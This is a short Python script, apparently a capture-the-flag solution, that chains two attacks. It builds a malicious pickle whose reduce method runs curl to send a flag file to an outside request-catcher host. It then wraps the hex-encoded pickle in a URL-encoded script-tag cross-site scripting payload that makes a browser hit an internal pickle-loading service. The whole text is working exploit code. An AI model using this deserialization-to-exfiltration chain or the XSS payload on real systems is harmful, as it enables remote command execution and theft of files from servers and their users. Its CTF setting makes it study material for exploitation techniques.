### MALICIOUS PICKLE ###
import pickle

# malicious pickle
class Exploit(object):
    def __reduce__(self):
        import os
        return (os.system, ('curl https://lego.requestcatcher.com/flag?$(cat /ctf/flag.txt)',))
    
# pickle it as hex
exploit = pickle.dumps(Exploit()).hex()


### REQUEST ###
print(f"?name=<script>fetch%28%27%2Fquery%27%2C%20%7Bmethod%3A%20%22POST%22%2C%20headers%3A%20%7B%22Content%2DType%22%3A%22application%2Fjson%22%7D%2C%20body%3AJSON%2Estringify%28%7B%22url%22%3A%20%22http://127.0.0.1:5902/pickle?pickle={exploit}%22%7D%29%7D%29</script>")